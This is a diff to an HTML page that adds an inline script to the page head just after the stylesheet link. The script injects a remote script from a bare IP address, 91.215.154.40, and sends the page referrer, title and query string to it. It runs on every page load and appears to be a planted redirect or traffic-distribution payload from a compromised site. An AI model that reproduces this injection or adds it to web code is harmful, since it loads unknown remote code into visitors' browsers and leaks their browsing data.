@@ -21,7 +21,16 @@
 
 	<link href="common/styles.css" rel="stylesheet">
 
-
+<span id="c10d2dc8-2733-1402-47a7-104fcae35f15"></span><script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='//91.215.154.40/GvBypK?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f25c911e4f55=script5f25c911e4f56&_cid=c10d2dc8-2733-1402-47a7-104fcae35f15'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && '//91.215.154.40/GvBypK?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5f25c911e4f55=script5f25c911e4f56'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
+</script>
 </head>
 <body>
 
